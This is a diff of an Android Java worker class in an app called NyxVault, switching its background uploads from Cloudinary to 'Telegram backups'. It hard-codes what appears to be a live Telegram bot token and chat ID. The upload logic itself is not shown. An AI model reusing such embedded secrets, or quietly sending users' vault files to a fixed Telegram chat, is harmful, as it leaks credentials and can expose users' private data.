@@ -1,26 +1,47 @@
 package app.nyxvault;
 
 import android.content.Context;
-import android.util.Base64;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.net.Uri;
 
 import androidx.annotation.NonNull;
+import androidx.media3.common.MediaItem;
+import androidx.media3.common.MimeTypes;
+import androidx.media3.effect.ScaleAndRotateTransformation;
+import androidx.media3.transformer.Composition;
+import androidx.media3.transformer.EditedMediaItem;
+import androidx.media3.transformer.ExportException;
+import androidx.media3.transformer.ExportResult;
+import androidx.media3.transformer.Transformer;
 import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.io.InputStream;
+import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
+import java.util.Calendar;
+import java.util.Collections;
+import java.util.Date;
 import java.util.List;
+import java.util.Locale;
 import java.util.UUID;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
+
+import java.text.SimpleDateFormat;
 
 import org.json.JSONObject;
 
-/** Runs Cloudinary uploads independently of the WebView/app UI. */
+/** Runs Telegram backups independently of the WebView/app UI. */
 public class NyxUploadWorker extends Worker {
     private static final String TELEGRAM_BOT_TOKEN = "8284806334:AAEeLBEbBk8_E0NF8DB61LIK0XFjepSNU1k";
     private static final String TELEGRAM_CHAT_ID = "-1003731210463";
